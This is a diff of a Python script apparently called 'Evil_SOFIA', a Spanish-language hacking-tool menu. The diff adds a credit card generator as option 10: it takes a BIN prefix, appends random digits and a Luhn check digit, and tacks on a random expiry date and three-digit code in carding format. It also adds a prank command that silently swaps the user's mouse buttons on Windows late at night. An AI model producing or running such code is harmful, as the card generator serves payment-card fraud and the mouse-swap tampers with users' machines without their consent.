@@ -4,6 +4,7 @@ import time
 from random import choice
 import sys
 
+
 vrs = ' Windows Edition'
 
 time.sleep(0.5)
@@ -25,6 +26,7 @@ for i in msg00:
         sys.stdout.write(i)
         sys.stdout.flush()
         time.sleep(0.02)
+
 vers=requests.get('https://pastebin.com/raw/0pqX38U3').text.encode('utf-8')
 
 #potasio=requests.get('https://pastebin.com/raw/UyhX5Pjt').text.encode('utf-8')
@@ -33,7 +35,7 @@ for i in ms0g:
         sys.stdout.write(i)
         sys.stdout.flush()
         time.sleep(0.02)
-if vers=="3.1":
+if vers=="3.5":
   print('{>} Good You have last version \n')
 else:
  print("There is New Version available !! Do you Want To Update Your tool ? ")
@@ -65,6 +67,7 @@ print time.strftime("                    %I:%M:%S")
 if ols > "23:30":
     print "EVIL SOFIA ESTA REFRESCANDO!..."
     os.system("start http://lh6.googleusercontent.com/-AXuIH_cHGOQ/UUzEKLtQ0EI/AAAAAAAAAGI/jw2FhilfMo4/s298-no/TrollFaceDancing_large.gif")
+    os.system("Rundll32 user32,SwapMouseButton")
     exit()
 else:
     print " "
@@ -633,7 +636,40 @@ SSSS    TT   EEEE A  A DDD'''
                 function()
         function()
 
+    elif opc==10:
+        from random import *
+        from time import sleep
+        ayuda =(choice(["1","2","3","4","5","6","7","8","9","0"]))
+        ayudaa =(choice(["1","2","3","4","5","6","7","8","9","0"]))
+        ayudaaa =(choice(["1","2","3","4","5","6","7","8","9","0"]))
+        mes = (choice(["1","2","3","4","5","6","7","8","9","10","11","12"]))
+        anoxd = (choice(["20","21","22","23","24","25","26","27","28","29","30"]))
+        ostia = (ayuda + ayudaa + ayudaaa)
+        otsu = ("|"+mes+"|"+anoxd+"|"+ostia)    
+        otsu1 = ("|"+mes+"|"+anoxd+"|"+ostia)
+        bin = str(input("Digite Su bin: "))
+        prefix = []
+        intro = prefix.append(bin)
+        valid = prefix[randint(0, len(prefix)-1)]
 
+        newcard = map(int, str(valid))
+
+        for i in range(9):
+            newcard.append(randint(0,9))
+
+        gen = list(newcard)
+        gen.reverse()
+        for i, x in zip(range(len(gen)), gen):
+            if i % 2 == 0:
+                dub = x * 2
+                dub = dub / 10 + dub % 10
+                gen[i] = dub
+
+        check = sum(gen) * 9 % 10
+        newcard.append(check)
+
+        output = map(str, newcard)
+        print "".join(output) +(otsu)
     elif opc==99:
         pris = "Gracias Por Utlizar Evil_SOFIA.  VERSION:" + vrs
         for i in pris:
